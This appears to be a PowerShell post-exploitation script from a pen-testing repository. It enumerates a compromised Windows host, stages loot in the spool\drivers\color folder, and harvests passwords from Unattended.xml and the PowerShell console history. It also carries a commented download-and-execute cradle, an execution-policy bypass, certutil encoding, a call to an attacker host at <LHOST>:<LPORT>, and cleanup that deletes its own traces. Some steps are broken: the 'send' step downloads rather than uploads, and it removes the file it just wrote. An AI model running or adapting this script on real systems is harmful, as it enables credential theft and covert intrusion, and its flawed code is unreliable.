#Download webenum.ps1
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/h1dz/Pen-Testing/blob/BashScripts/webenum.ps1')"
Unblock-File -Path .\webenum.ps1
powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\1.txt"
cd C:\Windows\System32\spool\drivers\color\
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
hostname | Out-File -FilePath .\1.txt -Append  
whoami | Out-File -FilePath .\1.txt -Append  
systeminfo | Out-File -FilePath .\1.txt -Append 
net user <user> | Out-File -FilePath .\1.txt -Append 
Get-LocalUser | Out-File -FilePath .\1.txt -Append  
net users | Out-File -FilePath .\1.txt -Append  
whoami /priv | Out-File -FilePath .\1.txt -Append 
# Dir files
dir | Out-File -FilePath .\1.txt -Append  
# IP info
ipconfig /all | Out-File -FilePath .\1.txt -Append  
# No password
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File -FilePath .\1.txt -Append  
# Passwords
Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" | Out-File -FilePath .\1.txt -Append 
# C:\ Owner
Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
# SPN

# Cmdlets
Get-Command -CommandType Cmdlet | measure | Out-File -FilePath .\1.txt -Append  
# Execution policy
Get-ExecutionPolicy -list | Out-File -FilePath .\1.txt -Append  
# Scheduled taks
schtasks /query /fo LIST /v | Out-File -FilePath .\1.txt -Append  
# Backup files
Get-ChildItem -Path C: -Include .bak -File -Recurse -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
# Enumerate already installed patches
Get-Hotfix | Out-File -FilePath .\1.txt -Append 
# show hidden files
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
# get running processes
Get-Process | Out-File -FilePath .\1.txt -Append 
# print bash history files then delete
Get-content "C:\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | Out-File -FilePath .\1.txt -Append 
# ports
echo "Scanning Top 20 Open Ports..." | Out-File -FilePath .\2.txt -Append 
echo "21" | Out-File -FilePath .\2.txt -Append 
echo "22" | Out-File -FilePath .\2.txt -Append
echo "23" | Out-File -FilePath .\2.txt -Append 
echo "25" | Out-File -FilePath .\2.txt -Append 
echo "53" | Out-File -FilePath .\2.txt -Append 
echo "80" | Out-File -FilePath .\2.txt -Append 
echo "110" | Out-File -FilePath .\2.txt -Append 
echo "111" | Out-File -FilePath .\2.txt -Append 
echo "135" | Out-File -FilePath .\2.txt -Append 
echo "143" | Out-File -FilePath .\2.txt -Append 
echo "443" | Out-File -FilePath .\2.txt -Append 
echo "445" | Out-File -FilePath .\2.txt -Append 
echo "993" | Out-File -FilePath .\2.txt -Append 
echo "996" | Out-File -FilePath .\2.txt -Append 
echo "1723" | Out-File -FilePath .\2.txt -Append 
echo "2049" | Out-File -FilePath .\2.txt -Append
echo "3306" | Out-File -FilePath .\2.txt -Append 
echo "3389" | Out-File -FilePath .\2.txt -Append 
echo "5900" | Out-File -FilePath .\2.txt -Append 
echo "8080" | Out-File -FilePath .\2.txt -Append 
# Open ports
$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Windows\System32\spool\drivers\color\2.txt

foreach($port in $text_port){

    if($port -in $system_ports.LocalPort){
        echo $port" = OPEN" | Out-File -FilePath .\1.txt -Append 
     }

}
# encode base64
certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 2.txt
rm 1.txt
rm 2.txt
#send output file
Invoke-WebRequest "http://<LHOST>:<LPORT>/2.txt" -OutFile "2.txt"	                                                                                     #Change L IP / PORT
# remove bash history
clear
rm webenum.ps1
